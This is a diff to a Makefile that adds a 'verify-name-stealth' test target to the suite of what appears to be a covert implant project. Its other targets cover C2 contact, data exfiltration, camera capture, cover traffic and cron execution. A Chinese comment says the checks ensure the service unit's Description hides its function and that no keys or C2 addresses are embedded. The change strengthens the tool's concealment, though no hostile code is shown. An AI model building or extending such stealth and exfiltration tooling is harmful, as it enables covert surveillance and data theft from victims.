@@ -279,6 +279,9 @@ verify-prefix:
 # 踩出来的缺陷）、不含密钥与 C2 地址、Description 不点明功能，以及 run.sh
 # 的 conf/bin 路径与 CONF_FILE/BIN_DST 同源。三条反向注入分别证明这三类
 # 断言不是恒绿。
+verify-name-stealth:
+	@python3 tests/verify_name_stealth.py
+
 verify-unit-contract:
 	@python3 tests/verify_unit_contract.py forward
 
@@ -287,7 +290,7 @@ verify-unit-contract-reverse:
 	@python3 tests/verify_unit_contract.py restart
 	@python3 tests/verify_unit_contract.py paths
 
-test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix verify-unit-contract verify-unit-contract-reverse $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
+test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix verify-name-stealth verify-unit-contract verify-unit-contract-reverse $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
@@ -311,4 +314,4 @@ inspect: all
 clean:
 	rm -rf $(BUILD)
 
-.PHONY: all test clean inspect verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix verify-unit-contract verify-unit-contract-reverse
+.PHONY: all test clean inspect verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-cron-exec verify-prefix verify-name-stealth verify-unit-contract verify-unit-contract-reverse
